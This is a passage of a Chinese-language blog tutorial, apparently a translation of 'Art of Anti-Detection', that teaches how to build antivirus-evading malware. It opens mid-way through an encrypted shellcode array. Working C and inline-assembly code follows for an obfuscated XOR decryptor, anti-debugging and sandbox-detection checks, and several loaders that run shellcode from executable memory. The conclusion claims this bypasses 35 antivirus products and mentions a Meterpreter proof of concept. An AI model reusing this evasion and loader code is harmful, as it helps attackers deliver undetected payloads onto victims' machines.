class="number">0x9f</span>, <span class="number">0x6a</span>, <span class="number">0xcb</span>, <span class="number">0xc5</span>, <span class="number">0x3e</span>,</span><br><span class="line">  <span class="number">0x23</span>, <span class="number">0x7e</span>, <span class="number">0x54</span>, <span class="number">0xff</span>, <span class="number">0xe3</span>, <span class="number">0x18</span>, <span class="number">0xd0</span>, <span class="number">0xe5</span>, <span class="number">0xe7</span>, <span class="number">0x7a</span>, <span class="number">0x50</span>, <span class="number">0xc4</span>,</span><br><span class="line">  <span class="number">0x31</span>, <span class="number">0x50</span>, <span class="number">0x6a</span>, <span class="number">0x97</span>, <span class="number">0x5a</span>, <span class="number">0x4d</span>, <span class="number">0x3c</span>, <span class="number">0xac</span>, <span class="number">0xba</span>, <span class="number">0x42</span>, <span class="number">0xe9</span>, <span class="number">0x6d</span>,</span><br><span class="line">  <span class="number">0x74</span>, <span class="number">0x17</span>, <span class="number">0x50</span>, <span class="number">0xca</span>, <span class="number">0xd2</span>, <span class="number">0x0e</span>, <span class="number">0xf6</span>, <span class="number">0x3c</span>, <span class="number">0x00</span>, <span class="number">0xda</span>, <span class="number">0xda</span>, <span class="number">0x26</span>,</span><br><span class="line">  <span class="number">0x2a</span>, <span class="number">0x43</span>, <span class="number">0x81</span>, <span class="number">0x1a</span>, <span class="number">0x2e</span>, <span class="number">0xe1</span>, <span class="number">0x5b</span>, <span class="number">0xce</span>, <span class="number">0xd2</span>, <span class="number">0x6b</span>, <span class="number">0x01</span>, <span class="number">0x71</span>,</span><br><span class="line">  <span class="number">0x07</span>, <span class="number">0xda</span>, <span class="number">0xda</span>, <span class="number">0xf4</span>, <span class="number">0xbf</span>, <span class="number">0x2a</span>, <span class="number">0xfe</span>, <span class="number">0x1a</span>, <span class="number">0x07</span>, <span class="number">0x24</span>, <span class="number">0x67</span>, <span class="number">0x9c</span>,</span><br><span class="line">  <span class="number">0xba</span>, <span class="number">0x53</span>, <span class="number">0xdd</span>, <span class="number">0x93</span>, <span class="number">0xe1</span>, <span class="number">0x75</span>, <span class="number">0x5f</span>, <span class="number">0xce</span>, <span class="number">0xea</span>, <span class="number">0x02</span>, <span class="number">0xd1</span>, <span class="number">0x5a</span>,</span><br><span class="line">  <span class="number">0x57</span>, <span class="number">0x4d</span>, <span class="number">0xe5</span>, <span class="number">0x91</span>, <span class="number">0x65</span>, <span class="number">0xa2</span>, <span class="number">0x7e</span>, <span class="number">0xcf</span>, <span class="number">0x90</span>, <span class="number">0x4f</span>, <span class="number">0x1f</span>, <span class="number">0xc8</span>,</span><br><span class="line">  <span class="number">0xed</span>, <span class="number">0x2a</span>, <span class="number">0x18</span>, <span class="number">0xbf</span>, <span class="number">0x73</span>, <span class="number">0x44</span>, <span class="number">0xf0</span>, <span class="number">0x4b</span>, <span class="number">0x3f</span>, <span class="number">0x82</span>, <span class="number">0xf5</span>, <span class="number">0x16</span>,</span><br><span class="line">  <span class="number">0xf8</span>, <span class="number">0x6b</span>, <span class="number">0x07</span>, <span class="number">0xeb</span>, <span class="number">0x56</span>, <span class="number">0x2a</span>, <span class="number">0x71</span>, <span class="number">0xaf</span>, <span class="number">0xa5</span>, <span class="number">0x73</span>, <span class="number">0xf0</span>, <span class="number">0x4b</span>,</span><br><span class="line">  <span class="number">0xd0</span>, <span class="number">0x42</span>, <span class="number">0xeb</span>, <span class="number">0x1e</span>, <span class="number">0x51</span>, <span class="number">0x72</span>, <span class="number">0x67</span>, <span class="number">0x9c</span>, <span class="number">0x63</span>, <span class="number">0x8a</span>, <span class="number">0xde</span>, <span class="number">0xe5</span>,</span><br><span class="line">  <span class="number">0xd2</span>, <span class="number">0xae</span>, <span class="number">0x39</span>, <span class="number">0xf4</span>, <span class="number">0xfa</span>, <span class="number">0x2a</span>, <span class="number">0x81</span>, <span class="number">0x0a</span>, <span class="number">0x07</span>, <span class="number">0x25</span>, <span class="number">0x59</span>, <span class="number">0xf4</span>,</span><br><span class="line">  <span class="number">0xba</span>, <span class="number">0x2a</span>, <span class="number">0xd9</span>, <span class="number">0xbe</span>, <span class="number">0x54</span>, <span class="number">0xc0</span>, <span class="number">0xf0</span>, <span class="number">0x4b</span>, <span class="number">0x29</span>, <span class="number">0x11</span>, <span class="number">0xeb</span>, <span class="number">0x1a</span>,</span><br><span class="line">  <span class="number">0x51</span>, <span class="number">0x76</span>, <span class="number">0x58</span>, <span class="number">0xf6</span>, <span class="number">0xb8</span>, <span class="number">0x9b</span>, <span class="number">0x49</span>, <span class="number">0x45</span>, <span class="number">0xf8</span>, <span class="number">0xf0</span>, <span class="number">0x0e</span>, <span class="number">0x5d</span>,</span><br><span class="line">  <span class="number">0x93</span>, <span class="number">0x84</span>, <span class="number">0xf4</span>, <span class="number">0xf4</span>, <span class="number">0xc4</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">char</span> Key[] = &#123;</span><br><span class="line">  <span class="number">0x07</span>, <span class="number">0x25</span>, <span class="number">0x0f</span>, <span class="number">0x9e</span>, <span class="number">0xba</span>, <span class="number">0x42</span>, <span class="number">0x81</span>, <span class="number">0x1a</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><br><br>由于我们编写了一个新的恶意代码，因反病毒防病毒软件不知道我们的恶意代码的哈希签名，因此我们不必担心基于特征码的检测，我们将对shellcode进行加密并混淆我们的反检测、反逆向工程、解密功能的代码，这样就足够绕过基于静态和启发式扫描，最后就只需要绕过反病毒软件的动态扫描就可以了，绕过动态扫描最重要的方法是通过AV detect实现，但是在开始写AV detect功能之前我们将介绍反病毒软件的启发式分析引擎是如何工作的。<br><br>## 启发式引擎<br><br>启发式引擎是基于统计和规则的分析机制。它们的主要目的是通过根据预定义的标准对代码片段进行分类并为代码片段提供威胁/风险等级，从而检测新一代（以前未知的）恶意代码，反病毒软件即使在扫描的简单hello world程序的情况下，启发式引擎也会确定威胁/风险评分，分数一旦高于阈值，该文件就会被标记为恶意。启发式引擎是反病毒软件中最高级的部分，它们使用大量规则和标准，因为没有反病毒公司发布有关其启发式引擎的设计文件或文档，所有关于其威胁/风险分级策略的已知选择性标准都是通过反复试验而发现的。<br>一些有关威胁等级的已知规则：<br>– 检测到解密循环<br>– 读取当前的计算机名称<br>– 读取密码机GUID<br>– 连接随机域名<br>– 读取Windows安装日期<br>– 删除可执行文件<br>– 在二进制文件中发现潜在的IP地址<br>– 修改代理设置<br>– 对正在运行的过程安装hook/patch程序<br>– 注入资源管理器explorer<br>– 注入远程进程<br>– 查询进程信息<br>– 设置进程错误模式避免弹出错误弹窗<br>– 不正常的熵值<br>– 检查潜在的反病毒软件<br>– 监视特定的注册表项以进行更改<br>– 包含提升特权的能力<br>– 修改软件策略设置<br>– 读取系统/视频BIOS版本<br>– PE标头中存在不常见的section<br>– 创建受保护的内存区域<br>– 创建很多进程<br>– 尝试长时间休眠<br>– 不常见的sections<br>– 读取Windows产品ID<br>– 包含解密循环<br>– 包含启动/交互设备驱动程序的功能<br>– 包含阻止用户输入的功能<br>…<br><br>在编写我们的AV检测和解密Shellcode函数时，我们必须注意以下所有规则。<br><br>### 解密Shellcode<br><br>混淆解密函数至关重要，大多数反病毒软件启发式引擎都能够检测PE文件内部的解密循环，在勒索软件攻击案例大量增加之后，甚至构建了一些启发式引擎专门用于检测加密/解密函数，一旦检测到解密函数，某些扫描器会等到ECX寄存器为0时，预示解密循环结束，扫描器会去分析被解密的文件内容<br>下面就是Decrypt Shellcode函数：<br><br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">DecryptShellcode</span><span class="params">()</span> </span>&#123;</span><br><span class="line">  <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="keyword">sizeof</span>(Shellcode); i++) &#123;</span><br><span class="line"></span><br><span class="line">    __asm</span><br><span class="line">    &#123;</span><br><span class="line">      PUSH EAX</span><br><span class="line">      XOR EAX, EAX</span><br><span class="line">      JZ True1</span><br><span class="line">      __asm __emit(<span class="number">0xca</span>)</span><br><span class="line">      __asm __emit(<span class="number">0x55</span>)</span><br><span class="line">      __asm __emit(<span class="number">0x78</span>)</span><br><span class="line">      __asm __emit(<span class="number">0x2c</span>)</span><br><span class="line">      __asm __emit(<span class="number">0x02</span>)</span><br><span class="line">      __asm __emit(<span class="number">0x9b</span>)</span><br><span class="line">      __asm __emit(<span class="number">0x6e</span>)</span><br><span class="line">      __asm __emit(<span class="number">0xe9</span>)</span><br><span class="line">      __asm __emit(<span class="number">0x3d</span>)</span><br><span class="line">      __asm __emit(<span class="number">0x6f</span>)</span><br><span class="line"></span><br><span class="line">      True1:</span><br><span class="line">      POP EAX</span><br><span class="line">    &#125;</span><br><span class="line">    Shellcode[i] = (Shellcode[i] ^ Key[(i % <span class="keyword">sizeof</span>(Key))]);</span><br><span class="line">    __asm</span><br><span class="line">    &#123;</span><br><span class="line">      PUSH EAX</span><br><span class="line">      XOR EAX, EAX</span><br><span class="line">      JZ True2</span><br><span class="line">      __asm __emit(<span class="number">0xd5</span>)</span><br><span class="line">      __asm __emit(<span class="number">0xb6</span>)</span><br><span class="line">      __asm __emit(<span class="number">0x43</span>)</span><br><span class="line">      __asm __emit(<span class="number">0x87</span>)</span><br><span class="line">      __asm __emit(<span class="number">0xde</span>)</span><br><span class="line">      __asm __emit(<span class="number">0x37</span>)</span><br><span class="line">      __asm __emit(<span class="number">0x24</span>)</span><br><span class="line">      __asm __emit(<span class="number">0xb0</span>)</span><br><span class="line">      __asm __emit(<span class="number">0x3d</span>)</span><br><span class="line">      __asm __emit(<span class="number">0xee</span>)</span><br><span class="line">      True2:</span><br><span class="line">      POP EAX</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><br><br>这是一个for循环，它使shellcode字节和key字节之间进行逻辑异或运算，而前后两部分汇编代码（有_asm开始的）是无意义的，使用随机字节覆盖逻辑异或运算但是执行时会跳过这部分代码。由于我们没有使用任何高级解密机制，因此足以混淆Decrypt Shellcode功能。<br><br>### 动态分析检测<br><br>同样，在编写沙箱检测函数时，需要对其进行混淆，如果启发式引擎检测到任何反逆向工程方法的信息，则对恶意软件的威胁评分将非常不利。<br><br>### 当前是否在被调试<br><br>我们的第一个反病毒检测机制将在我们的进程中检查调试器，需要使用一个Windows API函数，功能为确定调用过程是否正在由用户模式调试器调试。但是我们不会使用它，因为大多数反病毒软件都在监视win API调用，因此它们可能会将此功能检测为反逆向工程方法。我们使用PEB块中的BeingDebuged标志位而不是使用API。<br><br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="comment">// bool WINAPI IsDebuggerPresent(void);</span></span><br><span class="line">__asm</span><br><span class="line">&#123;</span><br><span class="line">CheckDebugger:</span><br><span class="line">  PUSH EAX                    <span class="comment">// Save the EAX value to stack</span></span><br><span class="line">  MOV EAX, [FS:<span class="number">0x30</span>]          <span class="comment">// Get PEB structure address</span></span><br><span class="line">  MOV EAX, [EAX+<span class="number">0x02</span>]         <span class="comment">// Get being debugged byte</span></span><br><span class="line">  TEST EAX, EAX               <span class="comment">// Check if being debuged byte is set</span></span><br><span class="line">  JNE CheckDebugger           <span class="comment">// If debugger present check again</span></span><br><span class="line">  POP EAX                     <span class="comment">// Put back the EAX value</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><br><br>通过使用内联汇编，这段代码使用指向PEB块中的BeingDebuged标志位的指针，如果存在调试器，它将再次检查直到堆栈中发生溢出，当发生溢出时，堆栈会触发异常并关闭进程，这是退出程序的最简单的方法。检查是否正在被调试的将绕过一定数量的反病毒产品，但是仍有一些反病毒软件已针对此问题采取了措施，因此我们需要对代码进行混淆处理以避免静态特征码分析。<br><br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">__asm</span><br><span class="line">  &#123;</span><br><span class="line">  CheckDebugger:</span><br><span class="line">    PUSH EAX</span><br><span class="line">    MOV EAX, DWORD PTR FS : [<span class="number">0x18</span>]</span><br><span class="line">    __asm</span><br><span class="line">    &#123;</span><br><span class="line">      PUSH EAX</span><br><span class="line">      XOR EAX, EAX</span><br><span class="line">      JZ J</span><br><span class="line">      __asm __emit(<span class="number">0xea</span>)</span><br><span class="line">    J:</span><br><span class="line">      POP EAX</span><br><span class="line">    &#125;</span><br><span class="line">    MOV EAX, DWORD PTR[EAX + <span class="number">0x30</span>]</span><br><span class="line">    __asm</span><br><span class="line">    &#123;</span><br><span class="line">      PUSH EAX</span><br><span class="line">      XOR EAX, EAX</span><br><span class="line">      JZ J2</span><br><span class="line">      __asm __emit(<span class="number">0xea</span>)</span><br><span class="line">    J2:</span><br><span class="line">      POP EAX</span><br><span class="line">    &#125;</span><br><span class="line">    CMP BYTE PTR[EAX + <span class="number">2</span>], <span class="number">0</span></span><br><span class="line">    __asm</span><br><span class="line">    &#123;</span><br><span class="line">      PUSH EAX</span><br><span class="line">      XOR EAX, EAX</span><br><span class="line">      JZ J3</span><br><span class="line">      __asm __emit(<span class="number">0xea</span>)</span><br><span class="line">    J3:</span><br><span class="line">      POP EAX</span><br><span class="line">    &#125;</span><br><span class="line">    JNE CheckDebugger</span><br><span class="line">    POP EAX</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure><br><br>我在所有操作之后都添加了跳转指令，这不会修改原始代码的作用，但是在跳转之间添加垃圾字节会混淆代码并避免被静态分析检测。<br><br>### 加载虚假的DLL<br><br>我们将尝试在运行时加载不存在的dll。通常，当我们尝试加载不存在的dll时，HISTENCE返回NULL，但是某些反病毒软件动态分析时会正常返回，以便进一步检查程序的执行流程,这样就可以检测到在沙盒中执行。<br><br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">bool</span> <span class="title">BypassAV</span><span class="params">(<span class="keyword">char</span> <span class="keyword">const</span> * argv[])</span> </span>&#123;</span><br><span class="line">  HINSTANCE DLL = LoadLibrary(TEXT(<span class="string">"fake.dll"</span>));</span><br><span class="line">  <span class="keyword">if</span> (DLL != <span class="literal">NULL</span>) &#123;</span><br><span class="line">    BypassAV(argv);</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure><br><br>### 运行时间<br><br>在这种方法中，我们将利用反病毒软件处理时间的漏洞。在大多数情况下，反病毒软件扫描器是为终端用户设计的，它们必须对用户友好并且适合日常使用，这意味着它们不会花费太多时间来扫描文件，而需要尽快扫描文件。最初，恶意软件开发人员使用sleep()函数等待扫描完成，但是如今，这种技巧几乎不再起作用，每个防病毒产品在遇到一个时都会跳过睡眠功能。我们将针对它们使用此代码，下面的代码使用了一个称为GetThickCount()的Windows API函数，该函数返回检索自系统启动以来经过的毫秒数，最长为49.7天。我们将使用它来获取自操作系统启动以来经过的时间，然后尝试睡眠1秒钟，在睡眠函数之后，我们将通过比较两个GetTickCout()值来检查运行环境Sleep函数是否被跳过。<br><br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> Tick = GetTickCount();</span><br><span class="line">  Sleep(<span class="number">1000</span>);</span><br><span class="line">  <span class="keyword">int</span> Tac = GetTickCount();</span><br><span class="line">  <span class="keyword">if</span> ((Tac - Tick) &lt; <span class="number">1000</span>) &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure><br><br>### 处理器核心数<br><br>此方法只用查询系统上处理器核心的数量。由于反病毒软件无法从主机分配过多资源，因此我们可以检查处理器核心数，以确定我们是否在沙箱中。同时某些反病毒软件沙盒也不支持多处理器因此在其沙盒中也仅仅会保留一个处理器。<br><br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">SYSTEM_INFO SysGuide;</span><br><span class="line">GetSystemInfo(&amp;SysGuide);</span><br><span class="line"><span class="keyword">int</span> CoreNum = SysGuide.dwNumberOfProcessors;</span><br><span class="line"><span class="keyword">if</span> (CoreNum &lt; <span class="number">2</span>) &#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><br><br>### 大内存分配<br><br>该方法也是利用了反病毒软件每次扫描的时间短的漏洞，我们只需分配近100 Mb的内存，然后将其填充为NULL字节，最后释放它。<br><br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">char</span> * Memdmp = <span class="literal">NULL</span>;</span><br><span class="line">Memdmp = (<span class="keyword">char</span> *)<span class="built_in">malloc</span>(<span class="number">100000000</span>);</span><br><span class="line"><span class="keyword">if</span> (Memdmp != <span class="literal">NULL</span>) &#123;</span><br><span class="line">  <span class="built_in">memset</span>(Memdmp, <span class="number">00</span>, <span class="number">100000000</span>);</span><br><span class="line">  <span class="built_in">free</span>(Memdmp);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><br><br>当程序内存在运行时开始增长时，最终反病毒软件扫描器将结束扫描，以免在文件上花费过多时间，该方法可以多次使用。这是一种非常原始和古老的技术，但它仍然绕过了大量的扫描器。<br><br>### trap标志位设置<br><br>trap标志用于单步调试跟踪程序。如果设置了此标志，则每条指令都会引发SINGLE_STEP异常。可以对陷阱标志进行操作，以阻止跟踪程序。我们可以使用以下代码操作陷阱标志。<br><br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">__asm</span><br><span class="line">&#123;</span><br><span class="line">  PUSHF 			<span class="comment">// Push all flags to stack</span></span><br><span class="line">  MOV DWORD [ESP], <span class="number">0x100</span>	<span class="comment">// Set 0x100 to the last flag on the stack</span></span><br><span class="line">  POPF 				<span class="comment">// Put back all flags register values		</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><br><br>### 通过互斥量触发WinExec<br><br>该方法由于其简单性而非常有前途，我们创建了一个条件来检查系统上是否已经存在某个互斥对象。<br><br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">HANDLE AmberMutex = CreateMutex(<span class="literal">NULL</span>, TRUE, <span class="string">"FakeMutex"</span>);</span><br><span class="line"><span class="keyword">if</span>(GetLastError() != ERROR_ALREADY_EXISTS)&#123;</span><br><span class="line">  WinExec(argv[<span class="number">0</span>],<span class="number">0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><br><br>如果CreateMutex功能未返回错误，我们将再次执行该恶意软件二进制文件，因为大多数反病毒产品都不会让程序在进行动态分析时启动新进程或访问外部的文件发生，如果返回mutex已经存在错误则可以开始执行解密功能。在反检测中，互斥量使用的想法更多。<br><br>### 正确执行Shellcode的方法<br><br>从Windows Vista开始，Microsoft引入了数据执行保护或DEP，这是一项安全功能，可以通过实时监视程序来帮助防止损坏计算机。监视可确保正在运行的程序有效地使用系统内存。如果您的计算机上存在某个程序实例错误地使用了内存，则DEP会注意到它，然后关闭该程序并通知您。这意味着您不能只将一些字节放入char数组中并执行它，而是需要使用Windows API函数使用read，write和execute标志分配一个内存区域。<br>Microsoft有几个用于保留内存页面的内存操作API函数，该领域中的大多数常见恶意软件都使用VirtualAlloc功能来保留内存页面，因为您可以猜测这些函数的常见用法有助于反病毒产品使用其他内存来定义检测规则操纵功能，并且可能会引起较少的注意。<br>我将列出几种具有不同内存操作API函数的shellcode执行方法：<br><br><strong>HeapCreate/HeapAlloc</strong>：<br><br>Windows还允许创建RWE堆区域<br><br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">ExecuteShellcode</span><span class="params">()</span></span>&#123;</span><br><span class="line">  HANDLE HeapHandle = HeapCreate(HEAP_CREATE_ENABLE_EXECUTE, <span class="keyword">sizeof</span>(Shellcode), <span class="keyword">sizeof</span>(Shellcode));</span><br><span class="line">  <span class="keyword">char</span> * BUFFER = (<span class="keyword">char</span>*)HeapAlloc(HeapHandle, HEAP_ZERO_MEMORY, <span class="keyword">sizeof</span>(Shellcode));</span><br><span class="line">  <span class="built_in">memcpy</span>(BUFFER, Shellcode, <span class="keyword">sizeof</span>(Shellcode));</span><br><span class="line">  (*(<span class="keyword">void</span>(*)())BUFFER)();	</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><br><br><strong>LoadLibrary/GetProcAddress</strong>:<br><br>LoadLibrary和GetProcAddress win API函数组合允许我们使用所有其他win API函数，并且这种使用方式不会直接调用内存操作函数和恶意软件，因此可能不太吸引人注意。<br><br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">ExecuteShellcode</span><span class="params">()</span></span>&#123;</span><br><span class="line">  HINSTANCE K32 = LoadLibrary(TEXT(<span class="string">"kernel32.dll"</span>));</span><br><span class="line">  <span class="keyword">if</span>(K32 != <span class="literal">NULL</span>)&#123;</span><br><span class="line">    MYPROC Allocate = (MYPROC)GetProcAddress(K32, <span class="string">"VirtualAlloc"</span>);</span><br><span class="line">    <span class="keyword">char</span>* BUFFER = (<span class="keyword">char</span>*)Allocate(<span class="literal">NULL</span>, <span class="keyword">sizeof</span>(Shellcode), MEM_COMMIT, PAGE_EXECUTE_READWRITE);</span><br><span class="line">    <span class="built_in">memcpy</span>(BUFFER, Shellcode, <span class="keyword">sizeof</span>(Shellcode));</span><br><span class="line">    (*(<span class="keyword">void</span>(*)())BUFFER)();	</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><br><br><strong>GetModuleHandle/GetProcAddress</strong>:<br><br>该方法甚至不使用LoadLibrary函数，因为它利用了已加载的kernel32.dll的优势，GetModuleHandle函数从一个已加载的dll中检索模块句柄，这个方法大概是最隐蔽的执行方法。<br><br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">ExecuteShellcode</span><span class="params">()</span></span>&#123;</span><br><span class="line">  MYPROC Allocate = (MYPROC)GetProcAddress(GetModuleHandle(<span class="string">"kernel32.dll"</span>), <span class="string">"VirtualAlloc"</span>);</span><br><span class="line">  <span class="keyword">char</span>* BUFFER = (<span class="keyword">char</span>*)Allocate(<span class="literal">NULL</span>, <span class="keyword">sizeof</span>(Shellcode), MEM_COMMIT, PAGE_EXECUTE_READWRITE);</span><br><span class="line">  <span class="built_in">memcpy</span>(BUFFER, Shellcode, <span class="keyword">sizeof</span>(Shellcode));</span><br><span class="line">  (*(<span class="keyword">void</span>(*)())BUFFER)();	</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><br><br><strong>多线程执行</strong>:<br><br>对逆向工程工程师来说，逆向多线程PE文件总是比较困难，这对于反病毒软件也是一个挑战，多线程方法可以与上述所有执行方法一起使用，将函数指针指向shellcode并通过创建新线程执行shellcode将使情况变得复杂，通过这种方式可以同时执行shellcode和检测反病毒软件。<br><br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">ExecuteShellcode</span><span class="params">()</span></span>&#123;</span><br><span class="line">  <span class="keyword">char</span>* BUFFER = (<span class="keyword">char</span>*)VirtualAlloc(<span class="literal">NULL</span>, <span class="keyword">sizeof</span>(Shellcode), MEM_COMMIT, PAGE_EXECUTE_READWRITE);</span><br><span class="line">  <span class="built_in">memcpy</span>(BUFFER, Shellcode, <span class="keyword">sizeof</span>(Shellcode));</span><br><span class="line">  CreateThread(<span class="literal">NULL</span>,<span class="number">0</span>,LPTHREAD_START_ROUTINE(BUFFER),<span class="literal">NULL</span>,<span class="number">0</span>,<span class="literal">NULL</span>);</span><br><span class="line">  <span class="keyword">while</span>(TRUE)&#123;</span><br><span class="line">    BypassAV(argv);</span><br><span class="line">  &#125;	</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><br><br>上面的代码通过创建一个新线程来执行shellcode，在创建线程之后，有一个无限的whlie循环正在执行BypassAV函数，这种方法几乎可以使我们的BypassAV函数的效果翻倍，BypassAV将不断检查在运行Shellcode时使用沙箱和动态分析标志，这对于绕过某些等待执行Shellcode的高级启发式引擎也至关重要。<br><br>### 结论<br><br>最后其实关于如何编译恶意软件的方法很少，在编译源代码时，需要使用诸如堆栈保护程序之类的保护措施，并且剥离符号对于加强我们的恶意软件的逆向工程过程并减小文件大小至关重要。 ，建议使用Visual Studio进行编译，因为本文使用了内联汇编语法。<br>当所有这些方法结合在一起时，生成的恶意代码便能够绕过35种最先进的反病毒产品。<br><br><div align="center"><br><img src="/img/anti_av_av.png" align><br></div>

<h2 id="POC">POC</h2><p>使用本文中介绍的技术创建的Meterpreter显示了我们的恶意软件如何在真实系统中产生结果。<br>这些方法迟早也会过期，但是总会有更多的方法绕过反病毒软件。</p>
<h2 id="第二部分">第二部分</h2><p>反检测的艺术第二部分已经发表，通过以下链接可以查看：<a href="http://www.youngroe.com/art-of-anti-detection-2-pe-backdoor-manufacturing/">http://www.youngroe.com/art-of-anti-detection-2-pe-backdoor-manufacturing/</a></p>
<h2 id="参考">参考</h2><p>[1] – <a href="https://en.wikipedia.org/wiki/Antivirus_software" target="_blank" rel="external">https://en.wikipedia.org/wiki/Antivirus_software</a><br>[2] – <a href="https://en.wikipedia.org/wiki/Static_program_analysis" target="_blank" rel="external">https://en.wikipedia.org/wiki/Static_program_analysis</a><br>[3] – <a href="https://en.wikipedia.org/wiki/Dynamic_program_analysis" target="_blank" rel="external">https://en.wikipedia.org/wiki/Dynamic_program_analysis</a><br>[4] – <a href="https://en.wikipedia.org/wiki/Sandbox_(computer_security)" target="_blank" rel="external">https://en.wikipedia.org/wiki/Sandbox_(computer_security)</a><br>[5] – <a href="https://en.wikipedia.org/wiki/Heuristic_analysis" target="_blank" rel="external">https://en.wikipedia.org/wiki/Heuristic_analysis</a><br>[6] – <a href="https://en.wikipedia.org/wiki/Entropy" target="_blank" rel="external">https://en.wikipedia.org/wiki/Entropy</a><br>[7] – <a href="https://en.wikipedia.org/wiki/Address_space_layout_randomization" target="_blank" rel="external">https://en.wikipedia.org/wiki/Address_space_layout_randomization</a><br>[8] –  <a 